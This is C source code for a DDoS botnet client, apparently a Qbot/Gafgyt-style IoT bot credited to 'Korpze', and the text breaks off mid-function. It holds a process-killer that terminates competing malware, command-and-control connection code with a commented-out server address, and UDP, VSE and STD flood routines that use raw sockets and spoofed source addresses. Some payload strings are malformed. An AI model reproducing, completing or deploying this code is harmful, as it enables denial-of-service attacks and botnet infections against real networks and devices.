#include <poll.h>
#include <stdlib.h>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      //bWFkZSBieSB4eHg
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <time.h>
#include <dirent.h>
#include <limits.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/param.h>
#include <sys/time.h>
#include <ctype.h>
#include <sys/prctl.h>
//#include <Korpze>

#include "includes.h"
#include "daemonhdr.h"

#define PHI 0x9e3779b9
#define PR_SET_NAME 15
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3
#define SOCKBUF_SIZE 1024
#define STD2_SIZE 69

/*
#ifndef BUILD_NUMBER
#define BUILD_NUMBER -1// DO NOT CHANGE THIS (UNKNOWN IS -1)
#endif
*/

//--------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------

// ONLY CHANGE THIS IF NOT USING DADDYL33T's BUILD.c
/*
#ifndef IPA
#define IPA 127// [127].0.0.1
#endif

#ifndef IPB
#define IPB 0// 127.[0].0.1
#endif

#ifndef IPC
#define IPC 0// 127.0.[0].1
#endif

#ifndef IPD
#define IPD 1// 127.0.0.[1]
#endif

#ifndef BP
#define BP 1337// your botport aka first argument of ./server <BP> 850 <AP>
#endif
*/
//--------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------

//static unsigned char *commServer[] = { "46.249.32.109:1337" }; //216.158.238.34:42516   0 - 65535
static unsigned char bot_name[64];
static int bot_version = 3;


uint32_t LOCAL_ADDRESS;

uint32_t local_addr(void)
{
    int fd = -1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(fd == -1)
    {
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("8.8.8.8");
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof(addr));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);

    //DEBUG_PRINT("Local address %d.%d.%d.%d!\n", addr.sin_addr.s_addr & 0xff, (addr.sin_addr.s_addr >> 8) & 0xff, (addr.sin_addr.s_addr >> 16) & 0xff, (addr.sin_addr.s_addr >> 24) & 0xff);

    return addr.sin_addr.s_addr;
}
#ifdef killer
void killer_maps() {
    DIR *dir;
    struct dirent *file;
    dir = opendir("/proc/");
    while(file = readdir(dir)) {
    int i;
    int a;
    int fd, pid;
    char rdmaps[100], rdmapspath[25];

    pid = atoi(file->d_name);
    
    if(pid == getpid() || pid == getppid() || pid == 0) goto end;
  
    sprintf(rdmapspath, "/proc/%d/maps", pid);

    fd = open(rdmapspath, O_RDONLY);
    read(fd, rdmaps, sizeof(rdmaps) - 1); 
    close(fd);  
    /* This Is Our Whitelist For Sys Process's - Enemyy */
  if(strstr(rdmaps, "/usr/lib/systemd/systemd") ||    
   strstr(rdmaps, "/usr/libexec/openssh/sftp-server") ||   
   strstr(rdmaps, "/usr/bin") ||    
   strstr(rdmaps, "/usr/sbin") ||   
   strstr(rdmaps, "/usr/lib") ||    
   strstr(rdmaps, "/var/lib") ||    
   strstr(rdmaps, "/var/spool") ||  
   strstr(rdmaps, "/var/Sofia") ||
   strstr(rdmaps, "sshd") ||        
   strstr(rdmaps, "bash") ||        
   strstr(rdmaps, "httpd") ||       
   strstr(rdmaps, "telnetd") ||     
   strstr(rdmaps, "dropbear") ||    
   strstr(rdmaps, "ropbear") ||     
   strstr(rdmaps, "encoder")) goto end;       

  /* Common Dir's Which Malware Get Executed In */
  if(strstr(rdmaps, "/tmp") ||            
   strstr(rdmaps, "/var/run/") || ///mnt
   strstr(rdmaps, "/mnt") ||
   strstr(rdmaps, "/root") ||
   strstr(rdmaps, "/var/tmp") ||
   strstr(rdmaps, "/boot") ||
   strstr(rdmaps, "/.") ||           
   strstr(rdmaps, "(deleted)") ||     
   strstr(rdmaps, "/home")) kill(pid,9);

     end:;
     memset(rdmaps, 0, sizeof(rdmaps)); 
  }
}
int killer_boot() {
    int childpid;
    childpid = fork();
    if(childpid > 0 || childpid == 1) return;
    while(1) {
        killer_maps();
        sleep(2);
    }
}
#endif
int initConnection();
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);
int mainCommSock = 0, currentServer = -1;
uint32_t *pids;
uint32_t scanPid;
uint64_t numpids = 0;
struct in_addr ourIP;
struct in_addr ourPublicIP;
unsigned char macAddress[6] = {0};

int getBuild() {
    return BUILD_NUMBER;
}
const char *useragents[] = {
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
    "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
    "TheSuBot/0.2 (www.thesubot.de)",
    "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
    "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
    "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
    "zspider/0.9-dev http://feedback.redkolibri.com/",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
    "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15",
    "Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
    "Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
    "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
    "Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532",
    "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
    "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
    "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
    "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0",
    "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
    "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
    "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
};

static uint32_t Q[4096], c = 362436;
void init_rand(uint32_t x) {
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void) {
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (uint32_t)(t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

void trim(char *str) {
    int i;
    int begin = 0;
    int end = strlen(str) - 1;

    while (isspace(str[begin])) begin++;

    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];

    str[i - begin] = '\0';
}
static void printchar(unsigned char **str, int c) {
    if (str) {
        **str = c;
        ++(*str);
    }
    else (void)write(1, &c, 1);
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
    register int pc = 0, padchar = ' ';
    if (width > 0) {
        register int len = 0;
        register const unsigned char *ptr;
        for (ptr = string; *ptr; ++ptr) ++len;
        if (len >= width) width = 0;
        else width -= len;
        if (pad & PAD_ZERO) padchar = '0';
    }
    if (!(pad & PAD_RIGHT)) {
        for ( ; width > 0; --width) {
            printchar (out, padchar);
            ++pc;
        }
    }
    for ( ; *string ; ++string) {
        printchar (out, *string);
        ++pc;
    }
    for ( ; width > 0; --width) {
        printchar (out, padchar);
        ++pc;
    }
    return pc;
}
static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase) {
    unsigned char print_buf[PRINT_BUF_LEN];
    register unsigned char *s;
    register int t, neg = 0, pc = 0;
    register unsigned int u = i;
    if (i == 0) {
        print_buf[0] = '0';
        print_buf[1] = '\0';
        return prints (out, print_buf, width, pad);
    }
    if (sg && b == 10 && i < 0) {
        neg = 1;
        u = -i;
    }

    s = print_buf + PRINT_BUF_LEN-1;
    *s = '\0';
    while (u) {
        t = u % b;
        if( t >= 10 )
            t += letbase - '0' - 10;
        *--s = t + '0';
        u /= b;
    }
    if (neg) {
        if( width && (pad & PAD_ZERO) ) {
            printchar (out, '-');
            ++pc;
            --width;
        }
        else {
            *--s = '-';
        }
    }

    return pc + prints (out, s, width, pad);
}
static int print(unsigned char **out, const unsigned char *format, va_list args ) {
    register int width, pad;
    register int pc = 0;
    unsigned char scr[2];
    for (; *format != 0; ++format) {
        if (*format == '%') {
            ++format;
            width = pad = 0;
            if (*format == '\0') break;
            if (*format == '%') goto out;
            if (*format == '-') {
                ++format;
                pad = PAD_RIGHT;
            }
            while (*format == '0') {
                ++format;
                pad |= PAD_ZERO;
            }
            for ( ; *format >= '0' && *format <= '9'; ++format) {
                width *= 10;
                width += *format - '0';
            }
            if( *format == 's' ) {
                register char *s = (char *)va_arg( args, int );
                pc += prints (out, s?s:"(null)", width, pad);
                continue;
            }
            if( *format == 'd' ) {
                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                continue;
            }
            if( *format == 'x' ) {
                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                continue;
            }
            if( *format == 'X' ) {
                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                continue;
            }
            if( *format == 'u' ) {
                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                continue;
            }
            if( *format == 'c' ) {
                scr[0] = (unsigned char)va_arg( args, int );
                scr[1] = '\0';
                pc += prints (out, scr, width, pad);
                continue;
            }
        }
        else {
out:
            printchar (out, *format);
            ++pc;
        }
    }
    if (out) **out = '\0';
    va_end( args );
    return pc;
}
int zprintf(const unsigned char *format, ...) {
    va_list args;
    va_start( args, format );
    return print( 0, format, args );
}
int szprintf(unsigned char *out, const unsigned char *format, ...) {
    va_list args;
    va_start( args, format );
    return print( &out, format, args );
}
int sockprintf(int sock, char *formatStr, ...) {
    unsigned char *textBuffer = malloc(2048);
    memset(textBuffer, 0, 2048);
    char *orig = textBuffer;
    va_list args;
    va_start(args, formatStr);
    print(&textBuffer, formatStr, args);
    va_end(args);
    orig[strlen(orig)] = '\n';
    zprintf("%s\n", orig);
    int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
    free(orig);
    return q;
}
int getHost(unsigned char *toGet, struct in_addr *i) {
    struct hostent *h;
    if((i->s_addr = inet_addr(toGet)) == -1) return 1;
    return 0;
}
void makeRandomStr(unsigned char *buf, int length) {
    int i = 0;
    for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}//(made) by Korpze#2000
int recvLine(int socket, unsigned char *buf, int bufsize) {
    memset(buf, 0, bufsize);
    fd_set myset;
    struct timeval tv;
    tv.tv_sec = 30;
    tv.tv_usec = 0;
    FD_ZERO(&myset);
    FD_SET(socket, &myset);
    int selectRtn, retryCount;
    if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
        while(retryCount < 10) {
            tv.tv_sec = 30;
            tv.tv_usec = 0;
            FD_ZERO(&myset);
            FD_SET(socket, &myset);
            if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                retryCount++;
                continue;
            }
            break;
        }
    }
    unsigned char tmpchr;
    unsigned char *cp;
    int count = 0;
    cp = buf;
    while(bufsize-- > 1) {
        if(recv(mainCommSock, &tmpchr, 1, 0) != 1) {
            *cp = 0x00;
            return -1;
        }
        *cp++ = tmpchr;
        if(tmpchr == '\n') break;
        count++;
    }
    *cp = 0x00;
    return count;
}
int connectTimeout(int fd, char *host, int port, int timeout) {
    struct sockaddr_in dest_addr;
    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    int valopt;
    long arg = fcntl(fd, F_GETFL, NULL);
    arg |= O_NONBLOCK;
    fcntl(fd, F_SETFL, arg);
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if(getHost(host, &dest_addr.sin_addr)) return 0;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if (res < 0) {
        if (errno == EINPROGRESS) {
            tv.tv_sec = timeout;
            tv.tv_usec = 0;
            FD_ZERO(&myset);
            FD_SET(fd, &myset);
            if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                lon = sizeof(int);
                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                if (valopt) return 0;
            }
            else return 0;
        }
        else return 0;
    }
    arg = fcntl(fd, F_GETFL, NULL);
    arg &= (~O_NONBLOCK);
    fcntl(fd, F_SETFL, arg);
    return 1;
}
int listFork() {
    uint32_t parent, *newpids, i;
    parent = fork();
    if (parent <= 0) return parent;
    numpids++;
    newpids = (uint32_t*)malloc((numpids + 1) * 4);
    for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
    newpids[numpids - 1] = parent;
    free(pids);
    pids = newpids;
    return parent;
}

in_addr_t getRandomIP(in_addr_t netmask) {
    in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
    return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned short csum (unsigned short *buf, int count) {
    register uint64_t sum = 0;
    while( count > 1 ) {
        sum += *buf++;
        count -= 2;
    }
    if(count > 0) {
        sum += *(unsigned char *)buf;
    }
    while (sum>>16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return (uint16_t)(~sum);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
    struct tcp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr=iph->saddr;
    pseudohead.dst_addr=iph->daddr;
    pseudohead.zero=0;
    pseudohead.proto=IPPROTO_TCP;
    pseudohead.length=htons(sizeof(struct tcphdr));
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
    unsigned short output = csum(tcp,totaltcp_len);
    free(tcp);
    return output;
}
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0;
    iph->saddr = source;
    iph->daddr = dest;
}
int sclose(int fd) {
    if(3 > fd) return 1;
    close(fd);
    return 0;
}

void sendCNC(unsigned char *ip,int port, int end_time) {
    int end = time(NULL) + end_time;
    int sockfd;
    struct sockaddr_in server;
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    while(end > time(NULL)) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        connect(sockfd , (struct sockaddr *)&server , sizeof(server));
        sleep(1);
        close(sockfd);
    }
}

void SendSTD(unsigned char *ip, int port, int secs) {
    int iSTD_Sock;
    iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1) {
        char *randstrings[] = {"PozHlpiND4xPDPuGE6tq","tg57YSAcuvy2hdBlEWMv","VaDp3Vu5m5bKcfCU96RX","UBWcPjIZOdZ9IAOSZAy6","JezacHw4VfzRWzsglZlF","3zOWSvAY2dn9rKZZOfkJ","oqogARpMjAvdjr9Qsrqj","yQAkUvZFjxExI3WbDp2g","35arWHE38SmV9qbaEDzZ","kKbPlhAwlxxnyfM3LaL0","a7pInUoLgx1CPFlGB5JF","yFnlmG7bqbW682p7Bzey","S1mQMZYF6uLzzkiULnGF","jKdmCH3hamvbN7ZvzkNA","bOAFqQfhvMFEf9jEZ89M","VckeqgSPaAA5jHdoFpCC","CwT01MAGqrgYRStHcV0X","72qeggInemBIQ5uJc1jQ","zwcfbtGDTDBWImROXhdn","w70uUC1UJYZoPENznHXB","EoXLAf1xXR7j4XSs0JTm","lgKjMnqBZFEvPJKpRmMj","lSvZgNzxkUyChyxw1nSr","VQz4cDTxV8RRrgn00toF","VQz4cwRfargn00toF","lSvZgNzxYbwTfwIyxw1nSr"};
        char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
        if (a >= 50)
        {
            send(iSTD_Sock, STD2_STRING, STD2_SIZE, 0);
            connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(iSTD_Sock);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
void makevsepacket1(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
    char *vse_payload;
    int vse_payload_len;
    vse_payload = "/x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32/x14/xF4/ + /x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32/x14/xF4/ w290w2xn", &vse_payload_len;
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0;
    iph->saddr = source;
    iph->daddr = dest;
}//VSE Method Revamped By Korpze1
void vseattack1(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
    char *vse_payload;
    int vse_payload_len;
    vse_payload = "/x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32/x14/xF4/ + /x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32/x14/xF4/ w290w2xn", &vse_payload_len;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32) {
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd) {
            return;
        }
        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1) {
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if(i == pollRegister) {
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck) {
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    } else {
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd) {
            return;
        }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
            return;
        }
        int counter = 50;
        while(counter--) {
            srand(time(NULL) ^ rand_cmwc());
        }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        makevsepacket1(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        udph->len = htons(sizeof(struct udphdr) + packetsize + vse_payload_len);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
        udph->check = (iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1) {
            sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( getRandomIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);
            if(i == pollRegister) {
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck) {
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
}

void SendSTDHEX(unsigned char *ip, int port, int secs)
{
    int std_packet1;
    int ehhehehe;
    srand(time(NULL));
    ehhehehe = rand() % 60;
    if(ehhehehe < 20) {
        std_packet1 = 1093;
    }
    else if(20 < ehhehehe < 40) {
        std_packet1 = 1193;
    }
    else if(40 < ehhehehe < 60) {
        std_packet1 = 1293;
    }
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    unsigned char *hexstring = malloc(1024);
    memset(hexstring, 0, 1024);
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
            "/73x/6ax/x4a/x4b/x4d/x44/x20/x44/x57/x29/x5f/x20/x44/x57/x49/x4f/x57/x20/x57/x4f/x4b/x3c/x20/x57/x44/x4b/x20/x44/x29/x5f/x41/",
